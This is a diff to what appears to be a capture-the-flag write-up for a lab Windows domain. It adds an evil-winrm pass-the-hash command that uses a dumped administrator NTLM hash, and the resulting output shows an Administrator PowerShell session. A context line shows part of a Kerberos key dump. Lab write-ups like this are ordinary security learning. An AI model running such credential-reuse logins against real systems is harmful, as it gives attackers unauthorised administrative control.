@@ -363,6 +363,16 @@ WIN-RRNTVQP3YBF$:des-cbc-md5:2640269491ce6e92
 I now have all the hashes
 
 ```python
-
+evil-winrm -i casc-dc1.cascade.local -u administrator -H '7c2ea40b06d267f1557a09ac086b4487'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
+
 
